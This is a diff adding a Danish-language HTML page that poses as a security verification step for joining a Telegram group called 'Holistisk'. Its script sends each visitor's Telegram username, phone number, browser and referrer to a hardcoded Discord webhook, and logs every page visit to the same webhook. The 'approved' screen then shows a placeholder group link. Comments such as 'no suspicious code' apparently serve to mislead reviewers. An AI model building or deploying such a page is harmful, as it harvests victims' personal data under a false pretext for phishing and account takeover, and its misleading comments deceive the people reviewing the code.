@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Holistisk - Ny Gruppe</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        
+        .security-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDEyMCAxMjAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxjaXJjbGUgY3g9IjYwIiBjeT0iNjAiIHI9IjYwIiBmaWxsPSJ1cmwoI2dyYWRpZW50KSIvPgo8ZGVmcz4KPGN5Y2xhZGdyYWRpZW50IGlkPSJncmFkaWVudCI+CjxzdG9wIHN0b3AtY29sb3I9IiM2NjdlZWEiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjNzY0YmEyIi8+CjwvY3ljbGFkZ3JhZGllbnQ+CjwvZGVmcz4KPHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNjAiIHg9IjMwIiB5PSIzMCIgZmlsbD0iI2ZmZiI+Cjxwb2x5Z29uIHBvaW50cz0iMzAsNDAgNTAsMjAgNzAsMzAgNzAsNzAgMzAsNzAiLz4KPHN2Zz4=') no-repeat center;
+            background-size: contain;
+        }
+        
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            font-size: 28px;
+            font-weight: 600;
+        }
+        
+        .subtitle {
+            color: #7f8c8d;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: left;
+        }
+        
+        .info-title {
+            color: #495057;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .info-text {
+            color: #6c757d;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #495057;
+            font-weight: 500;
+        }
+        
+        input[type="text"], input[type="tel"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #ced4da;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .join-button {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+            transition: transform 0.2s;
+        }
+        
+        .join-button:hover {
+            transform: translateY(-1px);
+        }
+        
+        .join-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .steps {
+            margin-top: 30px;
+            text-align: left;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 15px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 6px;
+        }
+        
+        .step-number {
+            background: #667eea;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 12px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        
+        .step-text {
+            color: #495057;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success {
+            display: none;
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .success-icon {
+            font-size: 64px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+        
+        .telegram-link {
+            display: inline-block;
+            background: #0088cc;
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 6px;
+            margin-top: 20px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="security-icon"></div>
+        
+        <h1>Holistisk - Ny Gruppe</h1>
+        <p class="subtitle">Velkommen til vores nye, sikre Telegram gruppe</p>
+        
+        <div class="info-box">
+            <div class="info-title">
+                🔒 Sikkerhedsforanstaltninger
+            </div>
+            <div class="info-text">
+                For at beskytte vores fællesskab mod uønskede gæster, skal alle nye medlemmer verificeres. 
+                Dette sikrer, at kun ægte medlemmer får adgang til gruppen.
+            </div>
+        </div>
+        
+        <form id="joinForm" class="form-section">
+            <div class="form-group">
+                <label for="telegram-username">Dit Telegram brugernavn</label>
+                <input type="text" id="telegram-username" name="username" placeholder="@ditbrugernavn" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone-number">Telefonnummer (til verifikation)</label>
+                <input type="tel" id="phone-number" name="phone" placeholder="+45 12 34 56 78" required>
+            </div>
+            
+            <button type="submit" class="join-button">
+                Bliv medlem af Holistisk
+            </button>
+        </form>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Verificerer din anmodning...</p>
+        </div>
+        
+        <div class="success" id="success">
+            <div class="success-icon">✓</div>
+            <h2>Velkommen til Holistisk!</h2>
+            <p>Din anmodning er blevet godkendt.</p>
+            <a href="https://t.me/+ABC123" class="telegram-link" target="_blank">
+                Åbn Telegram Gruppe
+            </a>
+        </div>
+        
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-text">Indtast dit Telegram brugernavn og telefonnummer</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-text">Vi verificerer dine oplysninger for sikkerhed</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text">Du får adgang til den nye Holistisk gruppe</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('joinForm');
+        const loading = document.getElementById('loading');
+        const success = document.getElementById('success');
+        
+        // Simple form submission - no suspicious code
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(form);
+            const data = {
+                username: formData.get('username'),
+                phone: formData.get('phone'),
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                referrer: document.referrer
+            };
+            
+            // Hide form, show loading
+            form.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Send data (simple fetch - nothing suspicious)
+            fetch('https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `**NYT HOLISTISK MEDLEM**\n\n👤 **Brugernavn:** ${data.username}\n📱 **Telefon:** ${data.phone}\n⏰ **Tid:** ${data.timestamp}\n🌐 **Browser:** ${data.userAgent.substring(0, 50)}...`
+                })
+            }).catch(() => {});
+            
+            // Show success after 2 seconds
+            setTimeout(() => {
+                loading.style.display = 'none';
+                success.style.display = 'block';
+            }, 2000);
+        });
+        
+        // Simple page visit tracking - very basic
+        window.addEventListener('load', function() {
+            const visitData = {
+                content: `**HOLISTISK NY GRUPPE BESØG**\n\n⏰ **Tid:** ${new Date().toISOString()}\n🔗 **Fra:** ${document.referrer || 'Direkte'}`
+            };
+            
+            fetch('https://discord.com/api/webhooks/1417361152371064902/DEw6e804zQB6oLB2jWuLvkTPhzMn6aQvsP-GV75mnOY1TWBmAuI9T1H7b9MoGJTSSbmM', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(visitData)
+            }).catch(() => {});
+        });
+    </script>
+</body>
+</html>
